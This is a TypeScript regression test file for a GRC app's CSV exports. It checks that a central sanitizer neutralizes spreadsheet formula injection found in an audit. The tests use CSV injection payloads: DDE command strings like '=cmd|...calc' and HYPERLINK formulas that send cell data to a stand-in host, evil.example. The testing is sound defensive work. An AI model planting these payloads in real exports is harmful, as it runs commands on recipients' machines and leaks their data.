// #S04-05 regression contract — audit ARCTOS-FULL-2026-08-31, Medium.
//
// Six export routes hand-rolled their own CSV escaper and only implemented
// RFC-4180 quoting. A field starting with `=`, `+`, `-` or `@` was therefore
// written verbatim, and Excel/LibreOffice evaluated it as a formula on the
// recipient's machine:
//
//   =cmd|'/C calc'!A1                      (DDE command execution, legacy)
//   =HYPERLINK("http://evil/?"&A1,"click") (silent data exfiltration)
//
// A GRC export goes to auditors and management by definition, so "the victim
// has to open the file" is the normal workflow, not a mitigating condition.
//
// The project already had `sanitizeCsvValue`, used correctly by
// export-engine / import-executor / translations-export. The fix routes every
// CSV cell through ONE helper (`toCsvCell`) and makes the legacy
// `escapeCsvField` neutralize too, so the two-step idiom is safe as well.

import { describe, it, expect, vi } from "vitest";
import {
  toCsvCell,
  toCsvRow,
  escapeCsvField,
  objectsToCsv,
  sanitizeCsvValue,
} from "@/lib/import-export/csv-sanitizer";

const PAYLOADS = [
  "=cmd|'/C calc'!A1",
  '=HYPERLINK("http://evil.example/?"&A1,"click me")',
  "+SUM(1+1)*cmd|'/C calc'!A0",
  "-2+3+cmd|'/C calc'!A0",
  "@SUM(1+1)",
  "\tSUM(1)",
  "\rSUM(1)",
];

/** A cell is safe when it cannot start a formula once the quoting is undone. */
function unquote(cell: string): string {
  if (cell.startsWith('"') && cell.endsWith('"')) {
    return cell.slice(1, -1).replace(/""/g, '"');
  }
  return cell;
}

describe("#S04-05 — CSV formula injection is neutralized centrally", () => {
  for (const payload of PAYLOADS) {
    it(`neutralizes ${JSON.stringify(payload)} in toCsvCell`, () => {
      const cell = toCsvCell(payload);
      expect(unquote(cell).startsWith("'")).toBe(true);
      expect(/^[=+\-@\t\r]/.test(unquote(cell))).toBe(false);
    });

    it(`neutralizes ${JSON.stringify(payload)} via the legacy escapeCsvField`, () => {
      // The historical mistake was "escape only". escapeCsvField now
      // neutralizes too, so old call sites are safe by construction.
      const cell = escapeCsvField(payload);
      expect(/^[=+\-@\t\r]/.test(unquote(cell))).toBe(false);
    });
  }

  it("neutralizes with a semicolon delimiter too (German-Excel exports)", () => {
    const cell = toCsvCell("=cmd|'/C calc'!A1", ";");
    expect(/^[=+\-@\t\r]/.test(unquote(cell))).toBe(false);
  });

  it("still quotes delimiters, quotes and newlines correctly", () => {
    expect(toCsvCell("a,b")).toBe('"a,b"');
    expect(toCsvCell('say "hi"')).toBe('"say ""hi"""');
    expect(toCsvCell("line1\nline2")).toBe('"line1\nline2"');
    expect(toCsvCell("a;b", ";")).toBe('"a;b"');
    // A comma is harmless when ';' is the delimiter.
    expect(toCsvCell("a,b", ";")).toBe("a,b");
  });

  it("leaves ordinary values untouched", () => {
    expect(toCsvCell("Datenschutzvorfall")).toBe("Datenschutzvorfall");
    expect(toCsvCell(42)).toBe("42");
    expect(toCsvCell(null)).toBe("");
    expect(toCsvCell(undefined)).toBe("");
  });

  it("joins arrays instead of stringifying them", () => {
    expect(toCsvCell(["a", "b"])).toBe("a; b");
  });

  it("double application is a no-op (idempotent)", () => {
    const once = sanitizeCsvValue("=cmd|'/C calc'!A1");
    expect(sanitizeCsvValue(once)).toBe(once);
  });

  it("toCsvRow neutralizes every cell, including headers", () => {
    const row = toCsvRow(["=evil()", "ok", "@also_evil"]);
    for (const cell of row.split(",")) {
      expect(/^[=+\-@]/.test(unquote(cell))).toBe(false);
    }
  });

  it("objectsToCsv neutralizes header AND data cells", () => {
    const csv = objectsToCsv(
      [{ title: "=cmd|'/C calc'!A1", owner: "@evil" }],
      [
        { key: "title", header: "=HeaderFormula()" },
        { key: "owner", header: "Owner" },
      ],
    );
    for (const line of csv.split("\n")) {
      for (const cell of line.split(",")) {
        expect(/^[=+\-@]/.test(unquote(cell))).toBe(false);
      }
    }
  });
});

// The ad-hoc routes are covered by construction: each one now builds its rows
// with `toCsvRow`/`toCsvCell` from this module. This test asserts the pattern
// the routes rely on — that a malicious risk title survives a full row build
// without becoming a formula.
describe("#S04-05 — a malicious record cannot produce a formula row", () => {
  it("risk export row", () => {
    const line = toCsvRow([
      "R-001",
      "=cmd|'/C calc'!A1", // risk title
      "cyber",
      "identified",
      "@evil.owner", // owner name
      "-IT", // department
    ]);
    for (const cell of line.split(",")) {
      expect(/^[=+\-@]/.test(unquote(cell))).toBe(false);
    }
  });

  it("RACI export row (previously had no escaping at all)", () => {
    const line = toCsvRow(["=Activity()", "R", "A"]);
    expect(line.split(",").every((c) => !/^[=+\-@]/.test(unquote(c)))).toBe(
      true,
    );
    // A comma inside an activity name no longer corrupts the file either.
    expect(toCsvRow(["Freigabe, final", "R"])).toBe('"Freigabe, final",R');
  });

  it("SoA export row with ';' delimiter", () => {
    const line = toCsvRow(
      ["A.5.1", '=HYPERLINK("http://evil","x")', "applicable"],
      ";",
    );
    for (const cell of line.split(";")) {
      expect(/^[=+\-@]/.test(unquote(cell))).toBe(false);
    }
  });
});

// ── End-to-end reproduction against a real export endpoint ──────────────
//
// GET /api/v1/isms/soa/export used its own `csvEscape`, which quoted only
// `; " \n`. A control title or applicability justification beginning with
// `=` therefore reached the auditor's spreadsheet as a live formula. This
// drives the actual route handler and asserts the emitted CSV body.
describe("#S04-05 — GET /api/v1/isms/soa/export emits no formula cells", () => {
  it("neutralizes a malicious control title and justification", async () => {
    vi.resetModules();

    const MALICIOUS_TITLE = "=cmd|'/C calc'!A1";
    const MALICIOUS_JUSTIFICATION =
      '=HYPERLINK("http://evil.example/?"&A1,"click")';

    vi.doMock("@grc/db", () => {
      const table = new Proxy({}, { get: () => "col" });
      const chain: Record<string, unknown> = {};
      for (const m of ["select", "from", "leftJoin", "where", "orderBy"]) {
        chain[m] = () => chain;
      }
      (chain as { then: unknown }).then = (resolve: (v: unknown) => void) =>
        resolve([
          {
            catalogCode: "A.5.1",
            catalogTitleDe: MALICIOUS_TITLE,
            catalogTitleEn: "Policies for information security",
            applicability: "applicable",
            applicabilityJustification: MALICIOUS_JUSTIFICATION,
            implementation: "implemented",
            implementationNotes: "@evil_note",
            lastReviewed: "2026-01-01",
          },
        ]);
      return { db: chain, soaEntry: table, catalogEntry: table };
    });
    vi.doMock("@grc/auth", () => ({
      requireModule: async () => undefined,
    }));
    vi.doMock("@/lib/api", () => ({
      withAuth: async () => ({
        orgId: "22222222-2222-2222-2222-222222222222",
        userId: "33333333-3333-3333-3333-333333333333",
      }),
    }));
    vi.doMock("drizzle-orm", () => ({
      eq: () => ({}),
      and: () => ({}),
    }));

    const { GET } = await import("../../app/api/v1/isms/soa/export/route");
    const res = await GET(
      new Request("http://localhost/api/v1/isms/soa/export"),
    );
    expect(res.status).toBe(200);
    const csv = await res.text();

    // The payloads are present as DATA…
    expect(csv).toContain("cmd|'/C calc'!A1");
    // …but no cell may START with a formula trigger once quoting is undone.
    const dataLine = csv.split("\n")[1];
    for (const cell of dataLine.split(";")) {
      expect(/^[=+\-@\t\r]/.test(unquote(cell))).toBe(false);
    }
    // Explicitly: the neutralizing apostrophe is there.
    expect(csv).toContain("'=cmd|'/C calc'!A1");
    expect(csv).toContain("'@evil_note");

    vi.doUnmock("@grc/db");
    vi.doUnmock("@grc/auth");
    vi.doUnmock("@/lib/api");
    vi.doUnmock("drizzle-orm");
  });
});
